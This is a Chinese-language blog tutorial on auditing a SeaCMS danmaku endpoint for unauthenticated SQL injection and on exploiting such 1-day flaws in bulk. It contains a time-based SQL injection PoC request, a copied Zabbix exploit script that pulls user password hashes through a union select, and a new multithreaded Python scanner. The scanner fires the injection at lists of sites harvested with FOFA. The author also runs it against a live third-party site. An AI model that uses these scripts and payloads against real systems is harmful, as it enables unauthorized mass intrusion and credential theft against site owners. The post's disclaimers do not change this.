# 浅谈代码审计+漏洞批量一把梭哈

## 前言

最近在学习src的挖掘，常规的src挖掘就是信息泄露，什么逻辑漏洞什么的，什么越权漏洞，但是说实话，挖掘起来不仅需要很多时间，而且还需要很多经验，当然其实还有一种挖掘的办法，就是利用刚出的1day去批量扫描，如果自己会代码审计的话，就再好不过了，下面给大家分享分享整个过程是怎么样的

**文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。**

## 工具介绍

项目地址https://github.com/W01fh4cker/Serein

【懒人神器】一款图形化、批量采集url、批量对采集的url进行各种nday检测的工具。可用于src挖掘、cnvd挖掘、0day利用、打造自己的武器库等场景。可以批量利用Actively Exploited Atlassian Confluence 0Day CVE-2022-26134和DedeCMS v5.7.87 SQL注入 CVE-2022-23337。

具体使用方法下面会介绍

## 漏洞样本

本次选取的是一个前些天看到的seacms的一个sql注入，当时也是自己也审计了一波的

这里给出审计的过程

### /js/player/dmplayer/dmku/index.php 未授权sql注入

这个相比于上一个来说是危害更大，因为不需要登录admin用户

![image-20240820170525672](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240820170525672.png)



确实是sleep了，说明漏洞存在，我们看到代码

```java
if ($_GET['ac'] == "edit") {
    $cid = $_POST['cid'] ?: showmessage(-1, null);
    $data = $d->编辑弹幕($cid) ?:  succeedmsg(0, '完成');
    exit;
}
```

我们跟进编辑弹幕方法

一路来到

```java
public static function 编辑_弹幕($cid)
    {
        try {
            global $_config;
            $text = $_POST['text'];
            $color = $_POST['color'];
            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
            
            $sql = "UPDATE sea_danmaku_list SET text='$text',color='$color' WHERE cid=$cid";
            $result = "UPDATE sea_danmaku_report SET text='$text',color='$color' WHERE cid=$cid";
            $conn->query($sql);
            $conn->query($result);
        } catch (PDOException $e) {
            showmessage(-1, '数据库错误:' . $e->getMessage());
        }
    }
```

这里我们可以看到查询又是使用的原生的query方法，所以并没有过滤

所以导致sql注入

还有我们看到当ac=del，type=list的时候

```java
else if ($_GET['ac'] == "del") {
        $id = $_GET['id'] ?: succeedmsg(-1, null);
        $type = $_GET['type'] ?: succeedmsg(-1, null);
        $data = $d->删除弹幕($id) ?: succeedmsg(0, []);
        succeedmsg(23, true);
```

进入删除弹幕($id)

```java
public function 删除弹幕($id)
    {
        //sql::插入_弹幕($data);
        sql::删除_弹幕数据($id);
    }
```

进入sql::删除_弹幕数据($id);

```java
public static function 删除_弹幕数据($id)
    {
        try {
            global $_config;
            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
            $conn->set_charset('utf8');
            if ($_GET['type'] == "list") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $result = "DELETE FROM sea_danmaku_list WHERE cid={$id}";
                $conn->query($sql);
                $conn->query($result);
            } else if ($_GET['type'] == "report") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $conn->query($sql);
            }
        } catch (PDOException $e) {
            showmessage(-1, '数据库错误:' . $e->getMessage());
        }
    }
```

我们的id是可以控制的，type也是可以控制的，而且没有任何的过滤，当type=list的时候，直接放进query函数进行查询

漏洞验证

POC   

```java
GET /js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(6)))x)&type=list HTTP/1.1
Host: seacms:8181
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(0)))x)&type=list
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5dl35hp50uj606p52se8kg91a2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM
Connection: keep-alive

```

效果如图，可以发现确实延迟了6秒

![image-20240821015634118](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821015634118.png)

## 工具利用过程

首先就是看工具的逻辑是如何添加漏洞的

首先看主文件

代码很长，说一下我们需要注意的点，首先就是配置,对于的fofa配置如下

需要你进入工具的时候配置邮箱和key

```java
def fofa_saveit_first():
    email = fofa_text1.get()
    key = fofa_text2.get()
    with open("fofa配置.conf","a+") as f:
        f.write(f"[data]\nemail={email}\nkey={key}")
        f.close()
    showinfo("保存成功！","请继续使用fofa搜索模块！下一次将自动读取，不再需要配置！")
    text3.insert(END,f"【+】保存成功！请继续使用fofa搜索模块！下一次将会自动读取，不再需要配置！您的email是：{email}；为保护您的隐私，api-key不会显示。\n")
    text3.see(END)
    fofa_info.destroy()
def fofa_saveit_twice():
    global email_r,key_r
    if not os.path.exists("fofa配置.conf"):
        fofa_saveit_first()
    else:
        email_r = getFofaConfig("data", "email")
        key_r = getFofaConfig("data", "key")
def fofa_info():
    global fofa_info,fofa_text1,fofa_text2,fofa_text3
    fofa_info = tk.Tk()
    fofa_info.title("fofa配置")
    fofa_info.geometry('230x100')
    fofa_info.resizable(0, 0)
    fofa_info.iconbitmap('logo.ico')
    fofa_email = tk.StringVar(fofa_info,value="填注册fofa的email")
    fofa_text1 = ttk.Entry(fofa_info, bootstyle="success", width=30, textvariable=fofa_email)
    fofa_text1.grid(row=0, column=1, padx=5, pady=5)
    fofa_key = tk.StringVar(fofa_info,value="填email对应的key")
    fofa_text2 = ttk.Entry(fofa_info, bootstyle="success", width=30, textvariable=fofa_key)
    fofa_text2.grid(row=1, column=1, padx=5, pady=5)
    button1 = ttk.Button(fofa_info, text="点击保存", command=fofa_saveit_twice, width=30, bootstyle="info")
    button1.grid(row=2, column=1, padx=5, pady=5)
    fofa_info.mainloop()
```

使用fofa的处理流程

![image-20241018135727613](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018135727613.png)

后续是通过fofa的api进行查询的，所以需要你的api，只有vip才有这个功能

然后下面是脚本调用逻辑

因为一个漏洞是需要你自己写一个python脚本的

然后加入你自己自定义的漏洞是在

![image-20241018140142362](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140142362.png)

这个逻辑应该很好理解，比如我的就是

```java
button50 = ttk.Button(group3,text="seacms前台sql注入",command=sql_injection_gui,width=45,bootstyle="primary")
button50.grid(row=15,column=2,columnspan=2,padx=5,pady=5)
```

然后就是写对应的利用脚本了

因为我们写的脚本是需要贴合工具的，所以先随便找一个脚本看看大概的架构是怎么样的

![image-20241018140341414](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140341414.png)

工具自带了许许多多的利用脚本，我们看一下如何仿写

比如zabbix_sql.py



```java
import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
"""
Zabbix ‘popup.php’SQL注入漏洞
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201112-017
Zabbix的popup.php中存在SQL注入漏洞。远程攻击者可借助only_hostid参数执行任意SQL命令。
"""
def zabbix_sql_exp(url):
    poc = r"""popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=1))%20union%20select%201,group_concat(surname,0x2f,passwd)%20from%20users%23"""
    target_url = url + poc
    status_str = ['Administrator', 'User']
    try:
        res = requests.get(url, Verify=False,timeout=3)
        if res.status_code == 200:
            target_url_payload = f"{target_url}"
            res = requests.get(url=target_url_payload,Verify=False)
            if res.status_code == 200:
                for i in range(len(status_str)):
                    if status_str[i] in res.text:
                        zabbix_sql.insert(END,"【*】存在漏洞的url：" + url + "\n")
                        zabbix_sql.see(END)
                        with open ("存在Zabbix—SQL注入漏洞的url.txt", 'a') as f:
                            f.write(url + "\n")
            else:
                target_url = url + '/zabbix/' + poc
                res = requests.get(url=target_url,verify=False)
                for i in range(len(status_str)):
                    if status_str[i] in res.text:
                        zabbix_sql.insert(END, "【*】存在漏洞的url：" + url + "\n")
                        zabbix_sql.see(END)
                        with open("存在Zabbix—SQL注入漏洞的url.txt", 'a') as f:
                            f.write(url + "\n")
        else:
            zabbix_sql.insert(END, "【×】不存在漏洞的url：" + url + "\n")
            zabbix_sql.see(END)
    except Exception as err:
        zabbix_sql.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        zabbix_sql.see(END)
def get_zabbix_addr():
    with open("url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def zabbix_sql_gui():
    zabbix_sql_poc = tk.Tk()
    zabbix_sql_poc.geometry("910x450")
    zabbix_sql_poc.title("Zabbix—SQL注入 漏洞一把梭")
    zabbix_sql_poc.resizable(0, 0)
    zabbix_sql_poc.iconbitmap('logo.ico')
    global zabbix_sql
    zabbix_sql = scrolledtext.ScrolledText(zabbix_sql_poc,width=123, height=25)
    zabbix_sql.grid(row=0, column=0, padx=10, pady=10)
    zabbix_sql.see(END)
    addrs = get_zabbix_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(zabbix_sql_exp, addr)
    zabbix_sql_poc.mainloop()
```

大概的架构就是访问地址，发送paylaod，然后对应利用成功和失败的特征进行鉴定，然后就是最后的gui模块



因此我们可以对应的写出一个脚本，我按照我的漏洞写出的脚本如下

```java
import requests
import time
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *


# 执行SQL注入检测的函数
def sql_injection_exp(url):
    target = url + "/js/player/dmplayer/dmku/index.php?ac=edit"
    data = {
        "cid": "(select(1)from(select(sleep(6)))x)",
        "text": "1",
        "color": "1"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    start_time = time.time()

    try:
        response = requests.post(target, data=data, headers=headers, timeout=10)
        elapsed_time = time.time() - start_time

        if elapsed_time > 5:
            output_text.insert(END, f"【*】找到SQL注入在 {target} (响应时间: {elapsed_time:.2f} 秒)\n")
            output_text.see(END)
            with open("找到sql注入的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            output_text.insert(END, f"【×】没有SQL注入在 {target} (响应时间: {elapsed_time:.2f} 秒)\n")
            output_text.see(END)
    except requests.exceptions.RequestException as err:
        output_text.insert(END, f"【×】目标请求失败：{target}，错误内容：{err}\n")
        output_text.see(END)


# 获取URL地址的生成器
def get_urls():
    with open('url.txt', 'r') as file:
        for line in file.readlines():
            yield line.strip()


# GUI界面
def sql_injection_gui():
    root = tk.Tk()
    root.geometry("910x450")
    root.title("seacms前台sql注入")
    root.resizable(0, 0)

    global output_text
    output_text = scrolledtext.ScrolledText(root, width=123, height=25)
    output_text.grid(row=0, column=0, padx=10, pady=10)

    urls = get_urls()
    max_threads = 30  # 并发线程数
    executor = ThreadPoolExecutor(max_workers=max_threads)

    for url in urls:
        future = executor.submit(sql_injection_exp, url)

    root.mainloop()


```

然后添加好模块

![](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140643396.png)

可以看见是添加成功了的

## 实战演示

首先就是搜集url了，配置好了之后只需要

![image-20241018140816637](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140816637.png)

因为我没有fofa的会员，这里使用自己搜集的url，放在一个文件里面的，如果有的话就不需要我这样操作了

然后来到你需要利用的板块

![image-20241018140917514](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140917514.png)



利用的效果

![image-20241018141059995](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141059995.png)

然后我们可以随便找个网址验证一下

进入网址效果如下，说明网址还在正常使用的

![image-20241018141225997](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141225997.png)

然后测试漏洞

![image-20241018141631256](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141631256.png)

可以看见漏洞是存在的

然后就是查权重了

![image-20241018141830224](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141830224.png)

这个可以一把梭哈的

## 最后

这种挖掘方式需要我们抓住时机,需要我们在day刚出来的时候就去开始批量扫描，如果自己会代码审计的话那就很不错了

**文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。**
